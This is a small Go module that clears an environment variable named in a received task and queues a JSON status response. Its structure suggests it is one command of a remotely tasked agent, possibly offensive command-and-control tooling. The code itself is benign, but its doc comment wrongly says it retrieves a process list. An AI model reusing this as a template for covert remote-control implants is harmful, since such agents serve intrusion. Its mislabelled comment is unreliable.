package unsetenv

import (
	"encoding/json"
	"fmt"
	"os"
	"pkg/profiles"
	"pkg/utils/structs"
	"strings"
	"sync"
)

var mu sync.Mutex

//Run - interface method that retrieves a process list
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	params := strings.TrimSpace(task.Params)
	err := os.Unsetenv(params)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Successfully cleared %s", params)
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
